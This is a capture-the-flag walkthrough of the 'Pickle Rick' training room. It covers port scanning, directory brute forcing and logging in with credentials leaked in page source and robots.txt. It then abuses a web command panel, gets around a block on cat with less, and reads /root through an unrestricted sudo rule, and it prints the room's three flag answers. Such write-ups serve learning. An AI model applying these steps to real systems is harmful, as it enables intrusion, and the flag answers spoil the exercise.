# Pickle Rick

## Machine Information

-   **Machine Name:** Pickle Rick
-   **Date:** 1/26/2026
-   **Date Completed:** 1/27/2026
-   **Status:** Completed
-   **Attacker OS:** Kali Linux
-   **Difficulty:** Easy

---

## Objectives / Room Questions

-   **First ingredient Rick needs:** `mr. meeseek hair`
-   **Second ingredient in Rick’s potion:** `1 jerry tear`
-   **Final ingredient:** `fleeb juice`

---

## 1. Reconnaissance

### Nmap Scan

`nmap -p- -sS -sC -sV --min-rate 1000 -Pn 10.64.191.231`
    

### Scan Summary

-   **Target:** 10.64.191.231
-   **Host Status:** Up (0.038s latency)
-   **Operating System:** Linux
-   **Ports Scanned:** 65,535 TCP
-   **Closed Ports:** 65,533 (reset)
-   **Nmap Version:** 7.98
-   **Scan Duration:** 22.55 seconds
-   **Scan Timestamp:** 2026-01-26 22:37 -0500

### Open Ports & Services

| Port | State | Service | Version / Notes |
| --- | --- | --- | --- |
| 22/tcp | open | SSH | OpenSSH 8.2p1 (Ubuntu 4ubuntu0.11) |
| 80/tcp | open | HTTP | Apache httpd 2.4.41 (Ubuntu) |

### SSH Host Keys

RSA     3072  05:ea:74:5a:16:08:35:c1:fc:d7:01:2a:f5:c0:44:b8
ECDSA    256  ef:cd:49:ae:0f:a0:8b:42:92:d1:2c:e8:cb:0f:6c:bc
ED25519  256  86:cd:3e:5c:e2:df:f9:89:a4:a8:93:9f:d8:85:f3:6b
    

### Web Service Overview

-   **Port:** 80/tcp
-   **Web Server:** Apache/2.4.41

---

## 2. Web Enumeration

### Initial Website Review

Accessing the web server reveals a themed landing page requesting help locating secret ingredients for a potion.

![website](/users/saintmichael/tryhackme/img/picklerick1.png)

### Source Code Analysis

```html

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>

```
    

**Credential Discovered:**

-   **Username:** `R1ckRul3s`

This suggests potential credential reuse for authentication services such as SSH or restricted web endpoints.

### Directory Brute Forcing

`gobuster dir -u http://10.65.180.225 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,js,bak,old,zip,log,conf,inc -t 40 -b 403,404 --timeout 10s`
    

### Gobuster Command Explanation

This command performs directory and file enumeration against the target web server using a large wordlist and common file extensions. It ignores 403 and 404 responses to reduce noise and uses multiple threads to improve speed.

### Gobuster Output

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.180.225
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt,js,bak,zip,log,inc,old,conf
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login.php            (Status: 200) [Size: 882]
assets               (Status: 301) [Size: 315] [--> http://10.65.180.225/assets/]
index.html           (Status: 200) [Size: 1062]
portal.php           (Status: 302) [Size: 0] [--> /login.php]
robots.txt           (Status: 200) [Size: 17]
denied.php           (Status: 302) [Size: 0] [--> /login.php]
index.html           (Status: 200) [Size: 1062]
Progress: 685091 / 685091 (100.00%)
===============================================================
Finished
===============================================================

```
    

## Gobuster Enumeration Results – Analysis Notes

The scan identified multiple valid endpoints, indicating a functional web application with authentication logic and static assets.

### Key Findings

-   **login.php:** Accessible login endpoint and primary attack surface.
-   **portal.php:** Redirects to login, indicating access control.
-   **denied.php:** Authorization failure handler.
-   **index.html:** Main landing page.
-   **assets/:** Static content directory.
-   **robots.txt:** Potential source of hidden paths.

---

## Exploring the directories
- Robots.txt
```bash
saintmichael@archangelkali~ > curl http://10.65.180.225/robots.txt
Wubbalubbadubdub
```


# Index of /assets

| Type | Name | Last Modified | Size | Description |
| --- | --- | --- | --- | --- |
| \[PARENTDIR\] | Parent Directory | \- | \- |  |
| \[TXT\] | bootstrap.min.css | 2019-02-10 16:37 | 119K |  |
| \[JS\] | bootstrap.min.js | 2019-02-10 16:37 | 37K |  |
| \[IMG\] | fail.gif | 2019-02-10 16:37 | 49K |  |
| \[JS\] | jquery.min.js | 2019-02-10 16:37 | 85K |  |
| \[IMG\] | picklerick.gif | 2019-02-10 16:37 | 222K |  |
| \[IMG\] | portal.jpg | 2019-02-10 16:37 | 50K |  |
| \[IMG\] | rickandmorty.jpeg | 2019-02-10 16:37 | 488K |  |

Nothing really useful here

![loginportal](/users/saintmichael/tryhackme/img/picklerick2.png)

Looking back to our previous notes we already have a username and a possible password?
might as well give it a try

- **Username:** `R1ckRul3s`
- **Possible password?:** `Wubbalubbadubdub` = this was pulled from robots.txt

Login was possible

## Investigating login.php

```HTML
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
</head>
<body>
  <nav class="navbar navbar-inverse">
    <div class="container">
      <div class="navbar-header">
        <a class="navbar-brand" href="#">Rick Portal</a>
      </div>
      <ul class="nav navbar-nav">
        <li class="active"><a href="#">Commands</a></li>
        <li><a href="/denied.php">Potions</a></li>
        <li><a href="/denied.php">Creatures</a></li>
        <li><a href="/denied.php">Potions</a></li>
        <li><a href="/denied.php">Beth Clone Notes</a></li>
      </ul>
    </div>
  </nav>

  <div class="container">
    <form name="input" action="" method="post">
      <h3>Command Panel</h3></br>
      <input type="text" class="form-control" name="command" placeholder="Commands"/></br>
      <input type="submit" value="Execute" class="btn btn-success" name="sub"/>
    </form>
        <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
  </div>
</body>
</html>

```
```
- We have a base64 encoded string
`Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`
Decodes to
`VmpGU1NtVkdTWGxTYkdScFUwWktjRlZyVmt0VE1WWnhVMjA1VG1KSGVIbFhhMXBoVlZaV1ZVMUVhejA=`
decodes to
`VjFSSmVGSXlSbGRpU0ZKcFVrVktTMVZxU205TmJHeHlXa1phVVZWVU1Eaz0`
decodes to
`V1RJeFIyRldiSFJpUkVKS1VqSm9NbGxyWkZaUVVUMDk=`
decodes to 
`WTIxR2FWbHRiREJKUjJoMllrZFZQUT09`
decodes to
`Y21GaVltbDBJR2h2YkdVPQ==`
decodes to
`cmFiYml0IGhvbGU=`
decodes to
`rabbit hole`

lmao sick. so that was a waste of time. 
```
## Command Console Notes

Let’s take a look at the command console:

![codeexecution](/users/saintmichael/tryhackme/img/picklerick3.png)

From the console, we can successfully run `ls`, but we do **not** have permission to use `cat` to read files directly.

Next, we check our current user context:

```bash
>whoami
www-data
```

This confirms we are operating as the low-privileged `www-data` user. Since `cat` is restricted, the next step is to look for alternative commands that can still display file contents.

One such option is `less`:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

`less` is a file pager, and in some restricted environments it is allowed even when `cat` is blocked. In this case, it successfully reveals the contents of the file.

**Flag 1:** `mr. meeseek hair`

This demonstrates a common weakness in command restrictions: blocking a specific tool does not block the underlying capability, only the most obvious way to reach it.

Next, we examine **clue.txt**:

```plaintext
Look around the file system for the other ingredient.
```

This hint suggests the flag isn’t handed to us directly. Instead, we need to enumerate the filesystem and search for additional files that may contain the remaining ingredient.

At this stage, directory traversal and careful inspection of accessible paths become the priority.

Running `find /home -type f -readable 2>/dev/null` produced a very large amount of output, revealing numerous readable files across user directories.

```
/home/ubuntu/.bash_logout
/home/ubuntu/.sudo_as_admin_successful
/home/ubuntu/.bashrc
/home/ubuntu/.profile
/home/rick/second ingredients
```

Among these results, `/home/rick/second ingredients` stands out. We list the contents of the `/home/rick` directory to gather more context:

```
ls /home/rick -la

total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

The file is owned by `root`, has world-writable and executable permissions, and uses a name with spaces, which warrants closer inspection. To determine its actual type, we use the `file` command:

```
file /home/rick/"second ingredients"
/home/rick/second ingredients: ASCII text
```

Since the file is identified as plain text, we safely view its contents using a pager:

```
less /home/rick/"second ingredients"
```

**Flag 2:** `1 jerry tear`

Now we need to find the last flag so lets re check what directories we have
`ls /`

```
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

At this point, it makes sense to inspect the `root` account more closely.

Running `ls /root` initially returns no output, but this alone does not confirm that access is fully restricted. To better understand our privileges, we enumerate sudo permissions for the current user.

```
sudo -l

Matching Defaults entries for www-data on ip-10-64-138-139:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-64-138-139:
    (ALL) NOPASSWD: ALL
```

This output reveals a critical misconfiguration: the `www-data` user is allowed to run _any_ command as `root` without providing a password.

With unrestricted sudo access confirmed, we retry listing the root directory using elevated privileges:

```
sudo ls /root

3rd.txt
snap
```

A file named `3rd.txt` is present in the root directory. We open it using `less` to safely view its contents:

```
sudo less /root/3rd.txt
3rd ingredients: fleeb juice
```

**Final Flag:** `fleeb juice`


